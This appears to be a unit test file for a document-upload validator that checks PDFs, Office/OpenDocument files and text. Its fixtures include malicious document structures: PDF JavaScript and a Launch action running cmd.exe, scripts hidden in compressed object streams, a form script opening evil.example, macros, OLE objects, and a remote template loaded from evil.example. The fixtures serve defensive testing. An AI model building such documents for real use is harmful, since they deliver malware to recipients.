// Unit check for src/validate.js with hand-built fixtures (no server needed).
import assert from 'node:assert/strict';
import { checkContent } from '../src/validate.js';
import { uploadForm } from '../src/documents.js';

const enc = s => new TextEncoder().encode(s);
const deflate = async (bytes, format) => new Uint8Array(await new Response(new Blob([bytes]).stream().pipeThrough(new CompressionStream(format))).arrayBuffer());
const concat = parts => {
  const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0));
  let o = 0;
  for (const p of parts) { out.set(p, o); o += p.length; }
  return out;
};
const pdf = (...objects) => enc(`%PDF-1.7\n${objects.join('\n')}\ntrailer << /Root 1 0 R >>\n%%EOF\n`);
const ok = async (label, ext, bytes, opts) => assert.equal(await checkContent(ext, bytes, opts), null, label);
const bad = async (label, ext, bytes, pattern, opts) => assert.match(await checkContent(ext, bytes, opts) ?? 'accepted', pattern, label);

// Minimal ZIP writer (stored or deflated entries; CRC is not checked by the validator).
async function zip(files) {
  const locals = [], central = [];
  let offset = 0;
  for (const [name, content, compress] of files) {
    const n = enc(name), raw = enc(content);
    const data = compress ? await deflate(raw, 'deflate-raw') : raw;
    const lh = new DataView(new ArrayBuffer(30));
    lh.setUint32(0, 0x04034b50, true); lh.setUint16(8, compress ? 8 : 0, true);
    lh.setUint32(18, data.length, true); lh.setUint32(22, raw.length, true); lh.setUint16(26, n.length, true);
    const ch = new DataView(new ArrayBuffer(46));
    ch.setUint32(0, 0x02014b50, true); ch.setUint16(10, compress ? 8 : 0, true);
    ch.setUint32(20, data.length, true); ch.setUint32(24, raw.length, true); ch.setUint16(28, n.length, true); ch.setUint32(42, offset, true);
    locals.push(new Uint8Array(lh.buffer), n, data);
    central.push(new Uint8Array(ch.buffer), n);
    offset += 30 + n.length + data.length;
  }
  const cd = concat(central);
  const eocd = new DataView(new ArrayBuffer(22));
  eocd.setUint32(0, 0x06054b50, true); eocd.setUint16(8, files.length, true); eocd.setUint16(10, files.length, true);
  eocd.setUint32(12, cd.length, true); eocd.setUint32(16, offset, true);
  return concat([...locals, cd, new Uint8Array(eocd.buffer)]);
}

// --- PDF
const page = '1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction [3 0 R /Fit] >> endobj';
await ok('plain PDF (OpenAction /Fit as LaTeX writes it)', 'pdf', pdf(page));
await bad('JavaScript action', 'pdf', pdf(page, '4 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj'), /JavaScript/);
await bad('hex-escaped name', 'pdf', pdf(page, '4 0 obj << /S /J#61vaScript /JS (x) >> endobj'), /JavaScript/);
await bad('launch action', 'pdf', pdf(page, '4 0 obj << /S /Launch /F (cmd.exe) >> endobj'), /Launch/);
const random = Uint8Array.from({ length: 4096 }, (_, i) => (i * 7919) % 251);
const binary = concat([enc(`%PDF-1.7\n${page}\n5 0 obj << /Length ${random.length + 12} >>\nstream\n`), enc('/JS (x) '), random, enc('/JS\nendstream\nendobj\n%%EOF\n')]);
await ok('"/JS" bytes inside a binary stream are ignored', 'pdf', binary);

const hidden = await deflate(enc('6 0 << /S /JavaScript /JS (app.alert(1)) >>'), 'deflate');
const objStm = (dict, body) => concat([enc(`%PDF-1.7\n${page}\n7 0 obj ${dict}\nstream\n`), body, enc('\nendstream\nendobj\n%%EOF\n')]);
await bad('JavaScript hidden in a compressed object stream', 'pdf', objStm(`<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length ${hidden.length} >>`, hidden), /JavaScript/);
await bad('same with an indirect /Length', 'pdf', objStm('<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length 8 0 R >>', hidden), /JavaScript/);
const cleanStm = await deflate(enc('6 0 << /Type /Page >>'), 'deflate');
await ok('clean object stream', 'pdf', objStm(`<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length ${cleanStm.length} >>`, cleanStm));
await bad('corrupt object stream (guest)', 'pdf', objStm('<< /Type /ObjStm /Filter /FlateDecode /Length 5 >>', enc('xxxxx')), /nicht geprüft/);
await ok('corrupt object stream (staff)', 'pdf', objStm('<< /Type /ObjStm /Filter /FlateDecode /Length 5 >>', enc('xxxxx')), { strict: false });

const attachment = pdf(page, '4 0 obj << /Names << /EmbeddedFiles 5 0 R >> >> endobj');
await bad('embedded file (guest)', 'pdf', attachment, /eingebettete Dateien/);
await ok('embedded file (staff, e.g. ZUGFeRD invoice)', 'pdf', attachment, { strict: false });
const encrypted = enc(`%PDF-1.7\n${page}\ntrailer << /Root 1 0 R /Encrypt 9 0 R >>\n%%EOF\n`);
await bad('encrypted (guest)', 'pdf', encrypted, /Verschlüsselte/);
await ok('encrypted (staff)', 'pdf', encrypted, { strict: false });

// Form fields of official forms format dates with Acrobat's AF* functions: allowed. Anything else: not.
const formJs = js => pdf(page, `4 0 obj <</JS(${js})/S/JavaScript>> endobj`, '5 0 obj << /S /JavaScript /JS (AFNumber_Format\\(2, 0, 0, 0, "", true\\);) >> endobj');
await ok('form field formatting (AFDate_FormatEx)', 'pdf', formJs('AFDate_FormatEx\\("d mmmm, yyyy"\\);'));
await bad('other script in a form action', 'pdf', formJs('app.launchURL\\("https://evil.example"\\);'), /JavaScript|JS/);
await bad('formatting plus a smuggled call', 'pdf', formJs('AFDate_FormatEx\\("d"\\); app.alert\\(1\\);'), /JavaScript|JS/);

// An object hidden inside a stream whose /Length was crafted to skip it (the reader finds it via xref).
const hiddenObj = enc(`%PDF-1.7\n${page}\n5 0 obj << /Length 60 >>\nstream\n6 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj\nendstream\nendobj\n%%EOF\n`);
await bad('object hidden in a stream body (guest)', 'pdf', hiddenObj, /ungewöhnliche Struktur/);

// --- Office / OpenDocument
const types = ['[Content_Types].xml', '<Types/>'];
const hyperlink = '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.org" TargetMode="External"/></Relationships>';
await ok('docx with an external hyperlink', 'docx', await zip([types, ['word/document.xml', '<w:document/>'], ['word/_rels/document.xml.rels', hyperlink, true]]));
await ok('xlsx printer settings are not OLE', 'xlsx', await zip([types, ['xl/printerSettings/printerSettings1.bin', 'x']]));
await bad('macros', 'docx', await zip([types, ['word/vbaProject.bin', 'x']]), /Makros/);
await bad('Excel 4.0 macro sheet', 'xlsx', await zip([types, ['xl/macrosheets/sheet1.xml', '<x/>']]), /Excel-4.0/);
await bad('OLE object', 'docx', await zip([types, ['word/embeddings/oleObject1.bin', 'x']]), /OLE/);
const template = '<Relationships><Relationship Id="r1" Type=\'http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\' Target="https://evil.example/t.dotm" TargetMode=\'External\'/></Relationships>';
await bad('remote template (deflated .rels)', 'docx', await zip([types, ['word/_rels/settings.xml.rels', template, true]]), /externe Inhalte/);
await bad('.RELS in upper case is checked too', 'docx', await zip([types, ['word/_rels/SETTINGS.XML.RELS', template]]), /externe Inhalte/);
const encoded = template.replace("TargetMode='External'", "TargetMode='&#69;xternal'");
await bad('character reference in TargetMode', 'docx', await zip([types, ['word/_rels/settings.xml.rels', encoded, true]]), /externe Inhalte/);
await bad('ODF macros', 'odt', await zip([['mimetype', 'application/vnd.oasis.opendocument.text'], ['Basic/Standard/Module1.xml', '<x/>']]), /Makros/);
await bad('not a zip', 'docx', enc('PK\u0003\u0004 but nothing else'), /kein gültiges/);

// --- text
await ok('UTF-8 text', 'txt', enc('Grüße aus Düsseldorf'));
await bad('invalid UTF-8', 'txt', Uint8Array.of(0x66, 0xff, 0x66), /nicht geprüft/);
await bad('NUL bytes', 'txt', enc('a\u0000b'), /Binärdaten/);

// Crafted input must not make the checks slow (exponential or quadratic regular expressions).
const quick = async (label, bytes, pattern) => {
  const t = Date.now();
  const r = await checkContent('pdf', bytes);
  assert.ok(Date.now() - t < 300, `${label}: ${Date.now() - t} ms`);
  if (pattern) assert.match(r ?? 'accepted', pattern, label);
};
await quick('long number in a formatting call', enc(`%PDF-1.4\n1 0 obj\n<< /AA << /F << /S /JavaScript /JS (AFNumber_Format(${'1'.repeat(400)}x) >> >> >>\nendobj\n`), /aktive Inhalte/);
await quick('long digit run after /Length', enc(`%PDF-1.4\n1 0 obj\n<< /Length ${'1'.repeat(60000)} R >>\nstream\nabc\nendstream\nendobj\n`));

// An upload request is limited while it is read, also without Content-Length: an endless body stops after 20 MB.
const endless = new ReadableStream({ pull(c) { c.enqueue(new Uint8Array(1 << 20)); } });
await assert.rejects(uploadForm(new Request('http://x/', { method: 'POST', body: endless, duplex: 'half', headers: { 'content-type': 'multipart/form-data; boundary=x' } })),
  e => e.status === 413, 'endless upload body');

console.log('ok – validate test passed');
